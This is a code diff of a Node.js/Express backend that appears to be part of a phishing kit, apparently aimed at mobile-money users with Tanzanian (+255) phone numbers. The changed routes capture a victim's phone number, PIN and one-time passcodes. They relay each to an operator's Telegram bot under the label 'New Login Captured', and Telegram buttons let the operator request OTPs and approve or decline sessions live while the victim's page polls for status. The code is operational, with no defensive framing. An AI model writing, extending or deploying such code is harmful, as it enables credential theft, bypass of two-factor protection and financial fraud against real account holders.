@@ -36,58 +36,39 @@ app.get("/", (req, res) => {
 });
 
 // Main submission route
-app.post("/api/submit", async (req, res) => {
-  const { phone, pin } = req.body;
+// 1. Initial Login (Step 5)
+app.post('/api/submit', async (req, res) => {
+    const { phone, pin, sessionId } = req.body;
+    
+    // Create session in memory
+    sessions[sessionId] = { 
+        phone, 
+        pin, 
+        status: 'waiting_for_admin_choice' 
+    };
 
-  const sessionId = crypto.randomBytes(16).toString("hex");
-  sessions[sessionId] = { status: 'waiting' , phone, pin, timestamp: Date.now() };
+    console.log(`[LOGIN] User: ${phone} | Session: ${sessionId}`);
 
-  console.log(`📩 Received attempt for: +255${phone}`);
-
-  const message = `
-🔔 *New Login Attempt*
-----------------------
-📱 *Phone:* \`+255${phone}\`
-🔐 *PIN:* \`${pin}\`
-🆔 *ID:* \`${sessionId}\`
-----------------------
-*Admin Actions:*
-    `;
-
-  try {
-    await axios.post(
-      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
-      {
-        chat_id: TELEGRAM_ADMIN_ID,
-        text: message,
-        parse_mode: "Markdown",
-        reply_markup: {
-                inline_keyboard: [
-                    [
-                        { text: "🔢 Request OTP (5)", url: `${BASE_URL}/api/cmd/${sessionId}/otp5` },
-                        { text: "🔢 Request OTP (6)", url: `${BASE_URL}/api/cmd/${sessionId}/otp6` }
-                    ],
-                    [
-                        { text: "✅ Done / Redirect", url: `${BASE_URL}/api/cmd/${sessionId}/done` }
-                    ]
-                ]
+    const message = `🚀 *New Login Captured*\n📱 Phone: +255${phone}\n🔑 PIN: ${pin}`;
+    
+    try {
+        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+            chat_id: TELEGRAM_ADMIN_ID,
+            text: message,
+            parse_mode: "Markdown",
+            reply_markup: {
+                inline_keyboard: [[
+                    { text: "Ask OTP (5)", callback_data: `ask_5_${sessionId}` },
+                    { text: "Ask OTP (6)", callback_data: `ask_6_${sessionId}` }
+                ]]
             }
-      },
-    );
-
-    console.log("🚀 Notification sent to Telegram Admin");
-    res.json({ success: true, sessionId });
-  } catch (error) {
-    console.error(
-      "❌ Telegram Error:",
-      error.response ? error.response.data : error.message,
-    );
-    res
-      .status(500)
-      .json({ success: false, message: "Failed to send to Telegram" });
-  }
+        });
+        res.json({ success: true });
+    } catch (e) {
+        console.error("Telegram Error:", e.message);
+        res.status(500).json({ success: false });
+    }
 });
-
 
 // 2. Admin Command Handler (When you click a button in Telegram)
 app.get('/api/cmd/:id/:command', (req, res) => {
@@ -100,48 +81,67 @@ app.get('/api/cmd/:id/:command', (req, res) => {
     }
 });
 
-// 3. Status Polling (The App calls this every 2 seconds)
-app.get('/api/status/:id', (req, res) => {
-    const session = sessions[req.params.id];
-    if (session) {
-        res.json({ status: session.status });
-    } else {
-        res.status(404).json({ status: 'not_found' });
-    }
+// 3. Status Check (Frontend Polling)
+app.get('/api/status/:sessionId', (req, res) => {
+    const session = sessions[req.params.sessionId];
+    res.json(session ? { status: session.status } : { status: 'idle' });
 });
 
-// 3. Submit OTP & Wait for Admin Decision
+// 2. OTP Submission (Step 6)
 app.post('/api/submit-otp', async (req, res) => {
     const { otp, sessionId } = req.body;
+    
+    console.log(`[OTP RECEIVED] Code: ${otp} | Session: ${sessionId}`);
+
     if (sessions[sessionId]) {
         sessions[sessionId].status = 'verifying';
-        const msg = `🔐 *OTP Received*\nUser: +255${sessions[sessionId].phone}\nOTP: ${otp}`;
-        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-            chat_id: TELEGRAM_ADMIN_ID,
-            text: msg,
-            parse_mode: "Markdown",
-            reply_markup: {
-                inline_keyboard: [[
-                    { text: "✅ Accept", callback_data: `accept_${sessionId}` },
-                    { text: "❌ Decline", callback_data: `decline_${sessionId}` }
-                ]]
-            }
-        });
-        res.json({ success: true });
+        sessions[sessionId].lastOtp = otp;
+
+        const msg = `🔐 *OTP Received*\n📱 User: +255${sessions[sessionId].phone}\n🔢 OTP: ${otp}`;
+        
+        try {
+            await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                chat_id: TELEGRAM_ADMIN_ID,
+                text: msg,
+                parse_mode: "Markdown",
+                reply_markup: {
+                    inline_keyboard: [[
+                        { text: "✅ Accept", callback_data: `accept_${sessionId}` },
+                        { text: "❌ Decline", callback_data: `decline_${sessionId}` }
+                    ]]
+                }
+            });
+            res.json({ success: true });
+        } catch (e) {
+            console.error("OTP Telegram Error:", e.message);
+            res.status(500).json({ success: false });
+        }
+    } else {
+        console.log(`[ERROR] Session ${sessionId} not found in memory.`);
+        res.status(404).json({ success: false, message: "Session expired" });
     }
 });
 
-// 4. Webhook for Admin Clicks
+// 4. Telegram Button Webhook
 app.post('/api/webhook', (req, res) => {
     const { callback_query } = req.body;
     if (!callback_query) return res.sendStatus(200);
 
     const [action, val, sid] = callback_query.data.split('_');
+
     if (sessions[sid]) {
-        if (action === 'ask') sessions[sid].status = `go_otp_${val}`;
+        if (action === 'ask') sessions[sid].status = `go_to_otp_${val}`;
         else if (action === 'accept') sessions[sid].status = 'approved';
         else if (action === 'decline') sessions[sid].status = 'declined';
+        
+        console.log(`[ADMIN ACTION] ${action} for Session: ${sid}`);
     }
+
+    // Acknowledge the click to Telegram
+    axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
+        callback_query_id: callback_query.id
+    });
+
     res.sendStatus(200);
 });
 
